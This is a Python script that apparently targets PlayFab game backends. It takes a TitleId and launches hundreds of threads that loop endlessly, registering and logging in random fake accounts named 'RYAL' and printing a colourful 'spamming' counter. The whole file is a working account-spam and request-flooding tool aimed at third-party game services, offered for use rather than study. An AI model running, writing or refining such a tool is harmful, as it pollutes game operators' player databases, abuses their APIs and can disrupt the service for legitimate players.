import requests
import random
import string
import os
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

# RGB color codes
COLORS = [
    "\033[38;2;255;0;0m",   # Red
    "\033[38;2;255;127;0m", # Orange
    "\033[38;2;255;255;0m", # Yellow
    "\033[38;2;0;255;0m",   # Green
    "\033[38;2;0;255;255m", # Cyan
    "\033[38;2;0;0;255m",   # Blue
    "\033[38;2;139;0;255m"  # Violet
]
RESET = "\033[0m"

print("                                                                   ╔═╗╔╗ ╔╗╔══╗ ║║ ")
print("                                                                   ║╔╝║║ ║║╚ ╗║ ║║ ")
print("                                                                   ║║ ║╚═╝║║╚╝╚╗║╚╗")
print("                                                                   ╚╝ ╚═╗╔╝╚═══╝╚═╝")
print("                                                                       ╔╝║ ")  
print("                                                                       ╚══╝")

TITLE = input("TitleId: ")  # "83BF3" for tests
CHARS = string.ascii_letters + string.digits
URL = f"https://{TITLE}.playfabapi.com/Client/RegisterPlayFabUser"
URL2 = f"https://{TITLE}.playfabapi.com/Client/LoginWithCustomID"
PASS = ''.join(random.choice(CHARS) for _ in range(23))
SUCCESS = 0

def spam():
    LOCAL = 0
    color_cycle = itertools.cycle(COLORS)
    while True:
        RAND = ''.join(random.choice(CHARS) for _ in range(8))
        DATA = {
            "TitleId": TITLE,
            "Username": "RYAL",  # Set the username to "RYAL"
            "Password": PASS + RAND,
            "RequireBothUsernameAndEmail": False,
            "CreateAccount": True,
            "CustomId": RAND
        }
        RES = requests.post(URL, headers={"Content-Type": "application/json"}, json=DATA)
        RAND2 = ''.join(random.choice(CHARS) for _ in range(8))
        DATA2 = {
            "TitleId": TITLE,
            "CustomId": RAND2,
            "DisplayName": "RYAL",  # Set the display name to "RYAL"
            "CreateAccount": True
        }
        RES2 = requests.post(URL2, headers={"Content-Type": "application/json", "X-PlayFabSDK": "PythonSdk-0.0.220411", "X-ReportErrorAsSuccess": "true"}, json=DATA2)
        color = next(color_cycle)
        if RES.status_code == 200:
            LOCAL += 1
            print(f"{color}spamming {LOCAL}{RESET}")
        if RES2.status_code == 200:
            LOCAL += 1
            print(f"{color}spamming {LOCAL}{RESET}")
    return LOCAL

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=os.cpu_count() * 100) as executor:
        futures_list = [executor.submit(spam) for _ in range(os.cpu_count() * 100)]
        for future in as_completed(futures_list):
            SUCCESS += future.result()

    print(f"{SUCCESS} (likely /2)")
    input('Press ENTER to exit')
